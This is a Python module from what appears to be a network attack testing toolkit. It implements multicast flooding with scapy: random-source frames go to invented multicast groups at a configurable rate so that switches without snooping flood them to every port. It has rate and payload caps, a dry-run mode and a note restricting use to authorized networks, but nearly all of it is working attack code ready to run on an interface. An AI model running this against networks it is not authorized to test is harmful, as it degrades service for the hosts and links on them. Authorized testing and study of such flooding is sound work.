"""Multicast flooding: send a high-rate stream to multicast groups nobody has joined.

A switch that does not know which ports want a multicast group floods it to every port
of the VLAN. Without snooping, or when snooping has not learned the group, a stream to
invented groups reaches every host and every link, and receivers that never asked for it
still spend time on it.

Every frame here goes from a random unicast source MAC to a random group address. Groups
are IPv4 multicast addresses (01:00:5e:xx:xx:xx, 23 bits of the group), so the
frames are ordinary multicast traffic. The payload uses an experimental EtherType.
The effect to measure is which ports receive the stream.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp

from macabre.attacks.common import random_mac

MAX_RATE = 5000.0          # frames per second; higher rates are refused
BATCH_SECONDS = 0.1        # frames are sent in batches this long
EXPERIMENTAL_ETHERTYPE = 0x88B5
MAX_PAYLOAD = 1400


def group_mac(rng: random.Random) -> str:
    """A random IPv4 multicast MAC address: 01:00:5e followed by 23 random bits."""
    low = rng.getrandbits(23)
    return "01:00:5e:{:02x}:{:02x}:{:02x}".format((low >> 16) & 0x7F, (low >> 8) & 0xFF, low & 0xFF)


@dataclass(frozen=True)
class MulticastFloodingConfig:
    iface: str                  # attacker interface, on the segment under test
    rate: float = 100.0         # frames per second
    payload_size: int = 64      # payload bytes per frame
    count: int = 0              # frames to send in total; 0 = run until stopped
    dry_run: bool = False       # build frames but do not send them

    def __post_init__(self) -> None:
        if not 0 < self.rate <= MAX_RATE:
            raise ValueError(f"Rate must be between 0 and {MAX_RATE:g} frames per second.")
        if not 0 <= self.payload_size <= MAX_PAYLOAD:
            raise ValueError(f"Payload size must be between 0 and {MAX_PAYLOAD} bytes.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")


@dataclass
class MulticastFloodingStats:
    frames: int = 0
    status: str = ""


def flood_frames(rng: random.Random, how_many: int, payload_size: int) -> list:
    """Frames from random source MACs to random multicast groups."""
    frames = []
    for _ in range(how_many):
        payload = bytes(rng.getrandbits(8) for _ in range(payload_size))
        frames.append(Ether(src=random_mac(rng), dst=group_mac(rng), type=EXPERIMENTAL_ETHERTYPE) / Raw(payload))
    return frames


def run_multicast_flooding(
    config: MulticastFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[MulticastFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> MulticastFloodingStats:
    """Send multicast frames at `rate` per second until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = MulticastFloodingStats(
            status=(
                f"Dry run: would send about {config.rate:g} multicast frames per second to random groups, "
                f"{config.payload_size} bytes each. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    per_batch = max(1, round(config.rate * BATCH_SECONDS))
    stats = MulticastFloodingStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        batch = per_batch
        if config.count:
            batch = min(batch, config.count - stats.frames)
        send(flood_frames(rng, batch, config.payload_size), iface=config.iface, verbose=False)
        stats.frames += batch
        on_progress(replace(stats))
        stop_event.wait(BATCH_SECONDS)
    return stats
